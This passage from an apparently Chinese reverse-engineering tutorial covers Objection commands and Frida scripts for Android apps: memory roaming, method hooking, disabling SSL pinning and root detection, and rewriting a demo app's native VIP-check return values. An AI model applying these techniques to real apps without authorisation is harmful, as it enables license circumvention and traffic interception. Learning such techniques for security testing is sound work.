class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">memory list exports liblog.so</span><br><span class="line">Save the output by adding `--json exports.json` to this <span class="built_in">command</span></span><br><span class="line">Type      Name                                  Address</span><br><span class="line">--------  ------------------------------------  ------------</span><br><span class="line"><span class="keyword">function</span>  android_log_write_int32               0x72e0be77c8</span><br><span class="line"><span class="keyword">function</span>  android_log_write_list_begin          0x72e0be76f0</span><br><span class="line"><span class="keyword">function</span>  __android_log_bswrite                 0x72e0be9bd8</span><br><span class="line"><span class="keyword">function</span>  __android_log_security                0x72e0bf2144</span><br><span class="line"><span class="keyword">function</span>  __android_log_bwrite                  0x72e0be9a18</span><br><span class="line"><span class="keyword">function</span>  android_log_reset                     0x72e0be75ec</span><br><span class="line"><span class="keyword">function</span>  android_log_write_string8             0x72e0be7a38</span><br><span class="line"><span class="keyword">function</span>  android_logger_list_free              0x72e0be8c04</span><br><span class="line"><span class="keyword">function</span>  __android_log_print                   0x72e0be9728</span><br><span class="line"><span class="keyword">function</span>  __android_logger_property_get_bool    0x72e0bf2248</span><br><span class="line"><span class="keyword">function</span>  android_logger_get_id                 0x72e0be8270</span><br><span class="line"><span class="keyword">function</span>  android_logger_set_prune_list         0x72e0be8948</span><br></pre></td></tr></table></figure><p>android hooking list activities -查看内存中加载的activity  &#x2F;android hooking list services -查看内存中加载的services</p><p>android intent launch_activity 类名 -启动<code>activity</code>或<code>service</code>(可以用于一些没有验证的activity,在一些简单的ctf中有时候可以出奇效)</p><p>关闭ssl校验 android sslpinning disable</p><p>关闭root检测 android root disable</p><h3 id="内存漫游"><a href="#内存漫游" class="headerlink" title="内存漫游"></a>内存漫游</h3><p>内存搜刮类实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">android heap search instances 类名(命令)</span><br><span class="line">Class instance enumeration complete <span class="keyword">for</span> com.zj.wuaipojie.Demo  </span><br><span class="line"> Hashcode  Class                  toString()</span><br><span class="line">---------  ---------------------  -----------------------------</span><br><span class="line">215120583  com.zj.wuaipojie.Demo  com.zj.wuaipojie.Demo@cd27ac7</span><br></pre></td></tr></table></figure><p>调用实例方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">android heap execute &lt;handle&gt; getPublicInt(实例的hashcode+方法名)</span><br><span class="line"><span class="comment"># 如果是带参数的方法，则需要进入编辑器环境  </span></span><br><span class="line">android heap evaluate &lt;handle&gt;  </span><br><span class="line">console.log(clazz.a(<span class="string">&quot;吾爱破解&quot;</span>));</span><br><span class="line"><span class="comment"># 按住esc+enter触发</span></span><br></pre></td></tr></table></figure><p>android hooking list classes -列出内存中所有的类(结果比静态分析的更准确)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">android hooking list classes </span><br><span class="line"></span><br><span class="line">tw.idv.palatis.xappdebug.MainApplication</span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain</span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain<span class="variable">$a</span></span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain<span class="variable">$b</span></span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain<span class="variable">$c</span></span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain<span class="variable">$d</span></span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookSelf</span><br><span class="line">u</span><br><span class="line">v</span><br><span class="line">void</span><br><span class="line">w</span><br><span class="line">xposed.dummy.XResourcesSuperClass</span><br><span class="line">xposed.dummy.XTypedArraySuperClass</span><br><span class="line"></span><br><span class="line">Found 10798 classes</span><br></pre></td></tr></table></figure><p>android hooking search classes 关键类名 -在内存中所有已加载的类中搜索包含特定关键词的类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes wuaipojie</span><br><span class="line">Note that Java classes are only loaded when they are used, so <span class="keyword">if</span> the expected class has not been found, it might not have been loaded yet.</span><br><span class="line">com.zj.wuaipojie.Demo</span><br><span class="line">com.zj.wuaipojie.Demo<span class="variable">$Animal</span></span><br><span class="line">com.zj.wuaipojie.Demo<span class="variable">$Companion</span></span><br><span class="line">com.zj.wuaipojie.Demo<span class="variable">$InnerClass</span></span><br><span class="line">com.zj.wuaipojie.Demo$<span class="built_in">test</span><span class="variable">$1</span></span><br><span class="line">com.zj.wuaipojie.MainApplication</span><br><span class="line">com.zj.wuaipojie.databinding.ActivityMainBinding</span><br><span class="line">... </span><br><span class="line"></span><br><span class="line">Found 38 classes</span><br></pre></td></tr></table></figure><p>android hooking search methods 关键方法名 -在内存中所有已加载的类的方法中搜索包含特定关键词的方法(一般不建议使用，特别耗时，还可能崩溃)</p><p>android hooking list class_methods 类名 -内存漫游类中的所有方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">android hooking list class_methods com.zj.wuaipojie.ui.ChallengeSixth</span><br><span class="line">private static final void com.zj.wuaipojie.ui.ChallengeSixth.onCreate<span class="variable">$lambda</span>-0(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">private static final void com.zj.wuaipojie.ui.ChallengeSixth.onCreate<span class="variable">$lambda</span>-1(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">private static final void com.zj.wuaipojie.ui.ChallengeSixth.onCreate<span class="variable">$lambda</span>-2(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">private static final void com.zj.wuaipojie.ui.ChallengeSixth.onCreate<span class="variable">$lambda</span>-3(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">protected void com.zj.wuaipojie.ui.ChallengeSixth.onCreate(android.os.Bundle)</span><br><span class="line">public final java.lang.String com.zj.wuaipojie.ui.ChallengeSixth.hexToString(java.lang.String)</span><br><span class="line">public final java.lang.String com.zj.wuaipojie.ui.ChallengeSixth.unicodeToString(java.lang.String)</span><br><span class="line">public final void com.zj.wuaipojie.ui.ChallengeSixth.toastPrint(java.lang.String)</span><br><span class="line">public static void com.zj.wuaipojie.ui.ChallengeSixth.$r8$lambda<span class="variable">$1lrkrgiCEFWXZDHzLRibYURG1h8</span>(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">public static void com.zj.wuaipojie.ui.ChallengeSixth.$r8$lambda<span class="variable">$IUqwMqbTKaOGiTaeOmvy_GjNBso</span>(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">public static void com.zj.wuaipojie.ui.ChallengeSixth.$r8$lambda<span class="variable">$Kc_cRYZjjhjsTl6GYNHbgD</span>-i6sE(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">public static void com.zj.wuaipojie.ui.ChallengeSixth.$r8$lambda<span class="variable">$PDKm2AfziZQo6Lv1HEFkJWkUsoE</span>(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line"></span><br><span class="line">Found 12 method(s)</span><br></pre></td></tr></table></figure><h3 id="ObjectionHook"><a href="#ObjectionHook" class="headerlink" title="ObjectionHook"></a>ObjectionHook</h3><p>hook类的所有方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class 类名</span><br></pre></td></tr></table></figure><p>hook方法的参数、返回值和调用栈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method 类名.方法名 --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p>hook 类的构造方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method 类名.<span class="variable">$init</span></span><br></pre></td></tr></table></figure><p>hook 方法的所有重载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method 类名.方法名</span><br></pre></td></tr></table></figure><h2 id="Hook-Native"><a href="#Hook-Native" class="headerlink" title="Hook Native"></a>Hook Native</h2><p><code>Process</code> 对象代表当前被Hook的进程，能获取进程的信息，枚举模块，枚举范围等</p><table><thead><tr><th align="left">API</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Process.id</code></td><td align="left">返回附加目标进程的 <code>PID</code></td></tr><tr><td align="left"><code>Process.isDebuggerAttached()</code></td><td align="left">检测当前是否对目标程序已经附加</td></tr><tr><td align="left"><code>Process.enumerateModules()</code></td><td align="left">枚举当前加载的模块，返回模块对象的数组</td></tr><tr><td align="left"><code>Process.enumerateThreads()</code></td><td align="left">枚举当前所有的线程，返回包含 <code>id</code>, <code>state</code>, <code>context</code> 等属性的对象数组</td></tr></tbody></table><p><code>Module</code> 对象代表一个加载到进程的模块(例如，在 Windows 上的 DLL，或在 Linux&#x2F;Android 上的 .so 文件),能查询模块的信息，如模块的基址、名称、导入&#x2F;导出的函数等</p><table><thead><tr><th align="left">API</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Module.load()</code></td><td align="left">加载指定so文件，返回一个Module对象</td></tr><tr><td align="left"><code>enumerateImports()</code></td><td align="left">枚举所有Import库函数，返回Module数组对象</td></tr><tr><td align="left"><code>enumerateExports()</code></td><td align="left">枚举所有Export库函数，返回Module数组对象</td></tr><tr><td align="left"><code>enumerateSymbols()</code></td><td align="left">枚举所有Symbol库函数，返回Module数组对象</td></tr><tr><td align="left"><code>Module.findExportByName(exportName)、Module.getExportByName(exportName)</code></td><td align="left">寻找指定so中export库中的函数地址</td></tr><tr><td align="left"><code>Module.findBaseAddress(name)、Module.getBaseAddress(name)</code></td><td align="left">返回so的基地址</td></tr></tbody></table><p><code>Memory</code>是一个工具对象，提供直接读取和修改进程内存的功能，能够读取特定地址的值、写入数据、分配内存等</p><table><thead><tr><th align="left">方法</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left"><code>Memory.copy()</code></td><td align="left">复制内存</td></tr><tr><td align="left"><code>Memory.scan()</code></td><td align="left">搜索内存中特定模式的数据</td></tr><tr><td align="left"><code>Memory.scanSync()</code></td><td align="left">同上，但返回多个匹配的数据</td></tr><tr><td align="left"><code>Memory.alloc()</code></td><td align="left">在目标进程的堆上申请指定大小的内存，返回一个<code>NativePointer</code></td></tr><tr><td align="left"><code>Memory.writeByteArray()</code></td><td align="left">将字节数组写入一个指定内存</td></tr><tr><td align="left"><code>Memory.readByteArray</code></td><td align="left">读取内存</td></tr></tbody></table><h3 id="枚举导入导出表"><a href="#枚举导入导出表" class="headerlink" title="枚举导入导出表"></a>枚举导入导出表</h3><ol><li><strong>导出表（Export Table）</strong>：列出了库中可以被其他程序或库访问的所有公开函数和符号的名称。</li><li><strong>导入表（Import Table）</strong>：列出了库需要从其他库中调用的函数和符号的名称。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//打印导入表</span></span><br><span class="line">        <span class="keyword">var</span> imports = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; imports.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(imports[i].<span class="property">name</span> == <span class="string">&quot;vip&quot;</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(imports[i])); <span class="comment">//通过JSON.stringify打印object数据</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(imports[i].<span class="property">address</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印导出表</span></span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; <span class="built_in">exports</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>[i]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Native函数的基础Hook打印"><a href="#Native函数的基础Hook打印" class="headerlink" title="Native函数的基础Hook打印"></a>Native函数的基础Hook打印</h3><p>整数型、布尔值类型、char类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_checkVip&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr); </span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//Interceptor.attach是Frida里的一个拦截器</span></span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">                <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>]);  <span class="comment">//打印第一个参数的值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);  <span class="comment">// 打印寄存器内容</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>].<span class="title function_">toInt32</span>()); <span class="comment">//toInt32()转十进制</span></span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">readCString</span>()); <span class="comment">//读取字符串 char类型</span></span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(args[<span class="number">2</span>])); <span class="comment">//内存dump</span></span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval&quot;</span>,retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">        <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_vipLevel&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">                <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                    <span class="comment">// 方法一</span></span><br><span class="line">                    <span class="keyword">var</span> jString = <span class="title class_">Java</span>.<span class="title function_">cast</span>(args[<span class="number">2</span>], <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>));</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数:&quot;</span>, jString.<span class="title function_">toString</span>());</span><br><span class="line">                    <span class="comment">// 方法二</span></span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">JNIEnv</span> = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">                    <span class="keyword">var</span> originalStrPtr = <span class="title class_">JNIEnv</span>.<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>], <span class="literal">null</span>).<span class="title function_">readCString</span>();        </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数:&quot;</span>, originalStrPtr);                                </span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="keyword">var</span> returnedJString = <span class="title class_">Java</span>.<span class="title function_">cast</span>(retval, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>));</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;返回值:&quot;</span>, returnedJString.<span class="title function_">toString</span>());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Native函数的基础Hook修改"><a href="#Native函数的基础Hook修改" class="headerlink" title="Native函数的基础Hook修改"></a>Native函数的基础Hook修改</h3><p>整数型修改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_checkVip&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args参数</span></span><br><span class="line">                args[<span class="number">0</span>] = <span class="title function_">ptr</span>(<span class="number">1000</span>); <span class="comment">//第一个参数修改为整数 1000，先转为指针再赋值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">20000</span>);  <span class="comment">//返回值修改</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval&quot;</span>,retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串类型修改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_vipLevel&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                <span class="keyword">var</span> <span class="title class_">JNIEnv</span> = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">                <span class="keyword">var</span> originalStrPtr = <span class="title class_">JNIEnv</span>.<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>], <span class="literal">null</span>).<span class="title function_">readCString</span>();        </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数:&quot;</span>, originalStrPtr);</span><br><span class="line">                <span class="keyword">var</span> modifiedContent = <span class="string">&quot;至尊&quot;</span>;</span><br><span class="line">                <span class="keyword">var</span> newJString = <span class="title class_">JNIEnv</span>.<span class="title function_">newStringUtf</span>(modifiedContent);</span><br><span class="line">                args[<span class="number">2</span>] = newJString;                                </span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                <span class="keyword">var</span> returnedJString = <span class="title class_">Java</span>.<span class="title function_">cast</span>(retval, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>));</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;返回值:&quot;</span>, returnedJString.<span class="title function_">toString</span>());</span><br><span class="line">                <span class="keyword">var</span> <span class="title class_">JNIEnv</span> = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">                <span class="keyword">var</span> modifiedContent = <span class="string">&quot;无敌&quot;</span>;</span><br><span class="line">                <span class="keyword">var</span> newJString = <span class="title class_">JNIEnv</span>.<span class="title function_">newStringUtf</span>(modifiedContent);</span><br><span class="line">                retval.<span class="title function_">replace</span>(newJString);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SO基址的获取方式"><a href="#SO基址的获取方式" class="headerlink" title="SO基址的获取方式"></a>SO基址的获取方式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> moduleAddr1 = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>).<span class="property">base</span>;  </span><br><span class="line"><span class="keyword">var</span> moduleAddr2 = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>).<span class="property">base</span>;  </span><br><span class="line"><span class="keyword">var</span> moduleAddr3 = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Hook未导出函数与函数地址计算"><a href="#Hook未导出函数与函数地址计算" class="headerlink" title="Hook未导出函数与函数地址计算"></a>Hook未导出函数与函数地址计算</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span 